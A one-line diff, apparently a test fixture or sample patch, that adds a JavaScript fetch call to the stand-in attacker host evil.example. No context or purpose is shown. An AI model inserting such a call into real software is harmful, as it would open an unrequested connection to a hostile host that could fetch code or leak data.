@@ -1,0 +1,1 @@
+fetch("http://evil.example/x")
